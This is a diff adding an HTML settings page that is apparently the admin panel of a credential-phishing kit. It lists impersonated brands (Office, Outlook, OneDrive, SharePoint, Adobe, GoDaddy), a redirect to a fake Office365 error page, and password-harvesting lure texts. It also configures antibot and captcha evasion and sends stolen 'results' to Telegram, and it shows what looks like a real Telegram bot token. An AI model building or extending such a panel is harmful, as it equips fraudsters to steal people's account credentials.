@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dayjs"></script>
+    <script src="https://cdn.jsdelivr.net/npm/dayjs/plugin/quarterOfYear.js"></script>
+
+    <!-- FontAwesome CDN -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body class="flex min-h-screen overflow-x-hidden  font-sans bg-[#F5F6FA]">
+  <div id="loading-screen" class="bg-[#fff] w-full h-screen ">
+    <dotlottie-player 
+        src="https://lottie.host/9f018104-7200-4acc-b063-be137822848f/Fc8rX0FSJh.lottie" 
+        background="transparent" 
+        speed="1" 
+        class="w-full h-screen  " 
+        loop 
+        autoplay>
+    </dotlottie-player>
+</div>
+    <!-- Sidebar -->
+    <div id="sidebar" class="bg-[#fff] text-[#212121] fixed left-0 top-0 flex h-screen shadow w-[250px] z-[999] border-r flex-col scroll-container overflow-x-hidden duration-300 ease-linear lg:translate-x-0 ">
+      <div class="p-4 flex justify-between items-center border-b">
+          <!-- Close Button for Mobile -->
+               <span class="text-[#212121] font-poppins flex-wrap w-full">Logo</span>
+           <button id="close-btn" class="block md:hidden text-2xl text-gray-400 hover:text-white  ">&times;</button>
+      </div>
+      <div id="main-menu" class="pl-[10px] pt-[10px]">
+          <span class="sidebar-text font-nunito text-[13px]">Main Menu</span>
+      </div>
+      <ul class="space-y-4 font-[600] text-[14px] leading-[19.1px] font-nunito">
+         
+          <li class="sidebar-item">
+              <a href="home.html" class="flex items-center font space-x-3 py-[10px] px-[10px] rounded-[5px]">
+                 <img src="assests/four-circle.png" alt="" class="w-[20px]">
+                  <span class="sidebar-text font-nunito">Dashboard</span>
+              </a>
+          </li>
+         
+          <li class="sidebar-item ">
+              <a href="hotmail&outlook.html" class="flex items-center space-x-3 py-[10px] px-[10px] rounded-[5px]">
+                  <img src="assests/email.png" alt="" class="w-[20px]">
+                  <span class="sidebar-text">Hotmail & Outlook</span>
+              </a>
+          </li>
+          <li class="sidebar-item">
+              <a href="news.html" class="flex items-center space-x-3 py-[10px] px-[10px] rounded-[5px]">
+                  <img src="assests/newspaper.png" alt="" class="w-[20px]">
+                  <span class="sidebar-text">News</span>
+              </a>
+          </li>
+          <li class="sidebar-item border-t mt-[125px]">
+              <a href="attachments.html" class="flex items-center space-x-3 py-[10px] px-[10px] rounded-[5px]">
+                  <img src="assests/join-us.png" alt="" class="w-[20px]">
+                  <span class="sidebar-text">Attachments</span>
+              </a>
+          </li>
+          
+          <li >
+              <a href="#" class="flex items-center space-x-3 py-[10px] px-[10px] rounded-[5px] group" id="pdf-attachment">
+                  <img src="assests/file.png" alt="" class="  w-[20px]  ">
+                  <span class="sidebar-text ">PDF & QR</span>
+                  <!-- Arrow Icon that will appear on hover -->
+                  <!-- <i class="fa fa-arrow-circle-down "></i> -->
+                  <img src="assests/down-chevron.png" alt="" class="  w-[20px] opacity-0 group-hover:opacity-100 transition-opacity duration-300">
+              </a>
+              <!-- Submenu -->
+              <ul class="hidden pl-6 space-y-1 transition-all duration-300 ease-in-out transform scale-y-0 origin-top">
+                  <li>
+                      <a href="Qr.html" class="flex items-center space-x-3  px-[10px] rounded-[5px]">
+                          <img src="assests/period.png" alt="" class="w-[30px] h-[30px]">
+                           <span class="sidebar-text">QR</span>
+                      </a>
+                  </li>
+                  <li>
+                      <a href="pdfAttachment.html" class="flex items-center space-x-3  px-[10px] rounded-[5px]">
+                          <img src="assests/period.png" alt="" class="w-[30px] h-[30px]">
+                           <span class="sidebar-text">PDF Attachment</span>
+                      </a>
+                  </li>
+                  <li>
+                      <a href="#" class="flex items-center space-x-3  px-[10px] rounded-[5px]">
+                          <img src="assests/period.png" alt="" class="w-[30px] h-[30px]">
+                          <span class="sidebar-text">Clear All Logs</span>
+                      </a>
+                  </li>
+              </ul>
+          </li>
+          
+          <li class=" w-full absolute bottom-[50px] ">
+              <span  id="mainDash" class="ml-[10px] text-[#878C97] text-[13px]">OTHER</span>
+              <a href="settings.html" class="w-full flex items-center space-x-3 py-[10px] px-[10px] rounded-[5px]">
+                  <span class="material-icons">settings</span>
+                  <span class="sidebar-text">Settings</span>
+              </a>
+          </li>
+          <li class=" w-full absolute bottom-[5px] ">
+              <a href="#" class="w-full text-[#b52424] flex items-center space-x-3 py-[10px] px-[10px] ">
+                  <span class="material-icons">logout</span>
+                  <span class="sidebar-text">Logout</span>
+              </a>
+          </li>
+      </ul>
+  </div>
+
+    <!-- Overlay (only visible on mobile when sidebar is open) -->
+    <div id="overlay" class="overlay"></div>
+
+    <!-- Main Content -->
+    <div id="content" class="w-full transition-all duration-300 md:ml-[250px] ml-[0px] sm:ml-0">
+
+        <!-- Header -->
+        <header class="w-full bg-white border py-4 px-[20px] flex items-center justify-between">
+            <div class="flex items-center ">
+                <!-- Hamburger Button (Mobile) -->
+                 <button id="hamburger" class="block md:hidden text-2xl text-gray-800">
+                    <span class="material-icons">sort</span>
+                </button>
+
+                <!-- Collapse/Expand Sidebar Button (Desktop) -->
+                <button id="toggle-sidebar" class="text-[#000]   text-xl hidden md:block ">
+                    <!-- <span class="material-icons">menu</span> -->
+                    <img src="assests/collapse.png" alt="" class="w-[20px]">
+                </button>
+ 
+                <!-- Title -->
+                <h1 class="text-2xl font-semibold ml-4">Settings</h1>
+            </div>
+
+            <!-- User Profile & Notifications -->
+            <div class="flex items-center space-x-4">
+                <!-- Notifications Button -->
+                <!-- <button class="text-gray-600 hover:text-gray-800">
+                    <span class="material-icons">notifications</span>
+                </button> -->
+            
+                <!-- Profile Dropdown -->
+                <div class="relative">
+                    <!-- Profile Button -->
+                    <button id="profile-button" class="text-gray-600 hover:text-gray-800">
+                        <!-- <span class="material-icons">account_circle</span> -->
+                    </button>
+            
+                    <!-- Dropdown Menu -->
+                    <div id="profile-dropdown" class="
+                     ">
+                        <!-- <a href="#" class="block px-4 py-2 text-sm text-gray-800">Profile</a>
+                        <a href="#" class="block px-4 py-2 text-sm text-gray-800">Logout</a> -->
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Content -->
+        <div  class="mx-[10px]   my-[30px] ">
+            <div class="grid gap-6 grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-3">
+                <!-- Office Card -->
+                
+                <div class="relative">
+                  <!-- Label for Dropdown -->
+                  <label class="block mb-2 text-[#333] font-normal text-[14px] leading-[20px] font-nunito">
+                    Phish List (changing phish list will reload page)
+                  </label>
+                
+                  <!-- Dropdown Toggle Button -->
+                  <button 
+                      onclick="toggleDropdown('dropdown-content')" 
+                      class="w-full bg-white text-gray-800 font-nunito flex justify-between items-center p-4 rounded-lg border border-gray-300 shadow-md hover:shadow-lg transition-all duration-300 ease-in-out focus:outline-none  ">
+                    <span id="dropdown-label" class="text-sm font-semibold">Office</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                      <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                    </svg>
+                  </button>
+                
+                  <!-- Dropdown Content (Hidden by default) -->
+                  <div id="dropdown-content" class="absolute w-full mt-1 bg-white shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                    <div class="p-2 space-y-2 max-h-[150px] overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                       <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Office')">Office</div>
+                       <!-- Add more options as needed -->
+                    </div>
+                  </div>
+                </div>
+              
+                <!-- Redirect Card -->
+                <div>
+                  <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Redirect URL (for each phishlist)</label>
+                  <div class="bg-white font-nunito p-4 rounded flex justify-between border">
+                      <span id="redirect-url" class="block text-[14px] leading-[16px] font-semibold text-gray-800  ">https://href.li/?https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11</span>
+                      <img src="assests/earth-globe.png" alt="" class="w-[20px] h-[20px]">  
+                  </div>
+              </div>
+              
+                <!-- Captcha Theme -->
+                <div class="relative">
+                  <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Captcha Theme</label>
+                  <!-- Dropdown Toggle Button -->
+                  <button 
+                      onclick="toggleDropdowns('dropdown-contents')" 
+                      class="w-full bg-white font-nunito flex justify-between p-4 rounded-lg border shadow-md hover:shadow-lg transition-all duration-300">
+                      <span id="dropdown-labels" class="text-sm font-semibold text-gray-800">Captcha</span>
+                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                      </svg>
+                  </button>
+          
+                  <!-- Dropdown Content (Hidden by default) -->
+ 
+                   <div id="dropdown-contents" class="absolute w-full mt-1 bg-white shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                    <div class="p-2 space-y-2 max-h-[200px] overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                        <div value="captcha" onclick="selectOption('Captcha')" class="cursor-pointer hover:bg-gray-100 rounded-md p-2" >Captcha</div>
+                       <div value="captcha-math" onclick="selectOption('Captcha Math')" class="cursor-pointer hover:bg-gray-100 rounded-md p-2" >Captcha Math</div>
+                       <div value="cloudflare" onclick="selectOption('Cloudflare Verify Human')" class="cursor-pointer hover:bg-gray-100 rounded-md p-2" >Cloudflare Verify Human</div>
+          
+                    </div>
+                  </div>
+              </div>
+              
+                <!-- Theme Titles -->
+                <div>
+                  <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">
+                    Theme Titles (Optional) Use # For Multiple Titles</label>
+                  <div class="bg-white font-nunito p-3 rounded flex justify-between border">
+                   <input type="text" class="flex-1 outline-none">
+                    <img src="assests/theme (1).png" alt="" class="w-[20px] h-[20px]">
+                  </div>
+                </div>
+              
+                <!-- Startup of Theme -->
+                <div class="relative">
+                  <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Startup of Theme</label>
+                  <!-- Dropdown Toggle Button -->
+                  <button 
+                      onclick="toggleDrop('dropdown-conten')" 
+                      class="w-full bg-white font-nunito flex justify-between p-4 rounded-lg border shadow-md hover:shadow-lg transition-all duration-300">
+                      <span id="dropdown-labelss" class="text-sm font-semibold text-gray-800">Outlook</span>
+                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                      </svg>
+                  </button>
+          
+                  <!-- Dropdown Content (Hidden by default) -->
+                 
+                   <div id="dropdown-conten" class="absolute w-full mt-1 bg-white shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                    <div class="p-2 space-y-2 max-h-[200px] overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                        <div value="captcha" onclick="selectOption('none')" class="cursor-pointer hover:bg-gray-100 rounded-md p-2" >none</div>
+                       <div value="captcha-math" onclick="selectOption('Outlook')" class="cursor-pointer hover:bg-gray-100 rounded-md p-2" >Outlook</div>
+           
+                    </div>
+                  </div>
+              </div>
+              
+                <!-- Theme -->
+                <div class="relative">
+                  <!-- Label for Dropdown -->
+                  <label class="block mb-2 text-[#333] font-normal text-[14px] leading-[20px] font-nunito">
+                    Phish List (changing phish list will reload page)
+                  </label>
+                
+                  <!-- Dropdown Toggle Button -->
+                  <button 
+                      onclick="toggleDro('dropdown-cont')" 
+                      class="w-full bg-white text-gray-800 font-nunito flex justify-between items-center p-4 rounded-lg border border-gray-300 shadow-md hover:shadow-lg transition-all duration-300 ease-in-out focus:outline-none outline-none">
+                    <span id="dropdown-lab" class="text-sm font-semibold">Select Item</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                      <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                    </svg>
+                  </button>
+                
+                  <!-- Dropdown Content (Hidden by default) -->
+                  <div id="dropdown-cont" class="absolute w-full mt-1 bg-white shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                    <div class="p-2 space-y-2 max-h-[200px] scroll-container font-nunito overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Office')">Office</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Excel')">Excel</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Outlook')">Outlook</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Outlook 2')">Outlook 2</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Outlook 3 Web App')">Outlook 3 Web App</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('365')">365</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('OneDrive')">OneDrive</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('SharePoint')">SharePoint</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('SharePoint Web App')">SharePoint Web App</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('MS Word')">MS Word</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Adobe')">Adobe</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('GoDaddy')">GoDaddy</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('OWA')">OWA</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('Voice Mail')">Voice Mail</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2" onclick="selectOption('PDF (New with Office Theme)')">PDF (New with Office Theme)</div>
+                    </div>
+                  </div>
+                </div>
+              
+              
+                <!-- Password Page Text -->
+               
+
+                <div class="relative">
+                  <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Password Page Text</label>
+                  <!-- Dropdown Toggle Button -->
+                  <button 
+                      onclick="togglen('dropdown-c')" 
+                      class="w-full bg-white font-nunito flex justify-between p-4 rounded-lg border shadow-md hover:shadow-lg transition-all duration-300">
+                      <span id="dropdown-la" class="text-sm font-semibold text-gray-800"> Enter Password to access your office mail</span>
+                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                      </svg>
+                  </button>
+          
+                  <!-- Dropdown Content (Hidden by default) -->
+                  <div id="dropdown-c" class="absolute w-full mt-1 bg-white font-nunito text-[12px] md:text-[14px] shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                    <div class="p-2 space-y-2 max-h-[200px] scroll-container font-nunito overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('N/A')">N/A</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Because')">Because you're accessing sensitive info, you need to verify your password.</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Excel')"> Because you're accessing sensitive data,please proceed to confirm your password for security verification</div>
+
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Excel')"> Enter password to access your office mail</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Excel')">Because you're accessing sensitive info, you need to verify your password to access your voicemail.</div>
+                      <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2  " onclick="selectOption('Excel')">  Verify your password to access your microsoft OneDrive </div>
+
+                    </div>
+                  </div>
+                  
+                  
+              </div>
+                  <!-- Password   -->
+                  <div>
+                    <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Password</label>
+                    <div class="bg-white font-nunito p-4 rounded flex justify-between border">
+                      <span id="redirect-urls" class="block text-[14px] leading-[16px] font-semibold text-gray-800">
+                        5588925439:AAHhnOerindYZvOshcag8SL5cPCjot7pN7Q
+                      </span>
+                      <img src="assests/pin-code.png" alt="" class="w-[20px] h-[20px]">
+                    </div>
+                  </div>
+
+                  <!-- Telegram Bots   -->
+                  <div>
+                    <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Telegram Bot Token</label>
+                    <div class="bg-white font-nunito p-4 rounded flex justify-between border">
+                      <span class="block text-[14px] leading-[16px] font-semibold text-gray-800">
+                         1002099622612
+                      </span>
+                      <img src="assests/pin-code.png" alt="" class="w-[20px] h-[20px]">
+                    </div>
+                  </div>
+
+                    <!-- Telegram chats   -->
+                    <div>
+                        <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Telegram Chat ID</label>
+                        <div class="bg-white font-nunito p-4 rounded flex justify-between border">
+                          <span class="block text-[14px] leading-[16px] font-semibold text-gray-800 overflow-hidden">
+                             3837638939039773209387843
+                          </span>
+                          <img src="assests/pin-code.png" alt="" class="w-[20px] h-[20px]">
+                        </div>
+                      </div>
+                      
+
+                       <!-- Anti Bot Level   -->
+                       <div class="relative">
+                        <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Antibot Level</label>
+                        <!-- Dropdown Toggle Button -->
+                        <button 
+                            onclick="toggl('dropdow')" 
+                            class="w-full bg-white font-nunito flex justify-between p-4 rounded-lg border shadow-md hover:shadow-lg transition-all duration-300">
+                            <span id="dropdown" class="text-sm font-semibold text-gray-800"> Enter Password to access your office mail</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+                                <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
+                            </svg>
+                        </button>
+                
+                        <!-- Dropdown Content (Hidden by default) -->
+                        <div id="dropdow" class="absolute w-full mt-1 bg-white font-nunito text-[12px] md:text-[14px] shadow-lg rounded-lg hidden z-10 transition-all duration-300 ease-in-out opacity-0 transform scale-95">
+                          <div class="p-2 space-y-2 max-h-[200px] scroll-container font-nunito overflow-y-auto scrollbar-thin scrollbar-thumb-gray-300 scrollbar-track-gray-100">
+                             <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Low(not Recommended)')">Low(not Recommended)</div>
+                            <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('Medium(not Recommended)')"> Medium(not Recommended)</div>
+      
+                            <div class="cursor-pointer hover:bg-gray-100 rounded-md p-2 border-b" onclick="selectOption('High(not Recommended)')"> High(not Recommended)</div>
+                            
+                          </div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                       <!-- Blocked  -->
+                    <div>
+                        <label class="block mb-2 text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Blocked IPS (comma-seperated)</label>
+                        <div class="bg-white font-nunito p-4 rounded flex justify-between border">
+                          <span>192.309.20394,834</span>
+                         </div>
+                      </div>
+             
+                      <div class="flex flex-col gap-4 items-start justify-start">
+                        <!-- Checkbox 1 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                          <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                          <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Hide link when detected</span>
+                        </label>
+                      
+                        <!-- Checkbox 2 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                          <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                          <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Antibot</span>
+                        </label>
+                      
+                        <!-- Checkbox 3 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                            <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                            <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Google authenticator</span>
+                          </label>
+                      </div>
+                        <!-- API Status 10 Days Remaining -->
+                       <div class=" space-y-2 items-center justify-start">
+                        <label class="text-[#212121] font-[400] text-[14px] leading-[25px] font-poppins">API Status 10 Days Remaining</label>
+                       <div class="flex flex-col gap-4">
+                        <!-- Checkbox 1 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                          <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                          <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Disable logging on AdminPanel</span>
+                        </label>
+                      
+                        <!-- Checkbox 2 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                          <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                          <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito"> Send Results to Telegram</span>
+                        </label>
+                      
+                        <!-- Checkbox 3 -->
+                        <label class="flex items-center gap-2 ml-[20px]">
+                          <input type="checkbox" class="form-checkbox cursor-pointer h-5 w-5 text-blue-600 rounded">
+                          <span class="text-[#333] font-[400] text-[14px] leading-[20px] font-nunito">Send invalid Results to Telegram</span>
+                        </label>
+                      </div>
+                       </div>
+
+                       <div class="flex flex-wrap gap-3 justify-end text-sm">
+                        <button class="bg-[#1e209a] text-white font-nunito rounded-md py-2 px-4 transition-all duration-300 ease-in-out transform hover:scale-105 hover:bg-[#161c77] focus:outline-none focus:ring-2 focus:ring-[#1e209a] shadow-sm">
+                            Regenerate Link
+                        </button>
+                        <button class="bg-[#127b46] text-white font-nunito rounded-md py-2 px-4 transition-all duration-300 ease-in-out transform hover:scale-105 hover:bg-[#0f6633] focus:outline-none focus:ring-2 focus:ring-[#127b46] shadow-sm">
+                            Save Changes
+                        </button>
+                        <button class="bg-[#d02c2c] text-white font-nunito rounded-md py-2 px-4 transition-all duration-300 ease-in-out transform hover:scale-105 hover:bg-[#b11e1e] focus:outline-none focus:ring-2 focus:ring-[#d02c2c] shadow-sm">
+                            Reset 2FA
+                        </button>
+                    </div>
+                    
+                    
+          </div>
+        </div>
+    <!-- Script -->
+    
+    <script src="./js/script.js"></script>
+     <script src="https://unpkg.com/@dotlottie/player-component@2.7.12/dist/dotlottie-player.mjs" type="module"></script>
+     <script src="js/LoadingScreen.js"></script>
+<script src="js/settings.js"></script>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@2.0.8/dist/lottie-player.js"></script>
+
+</body>
+
+</html>
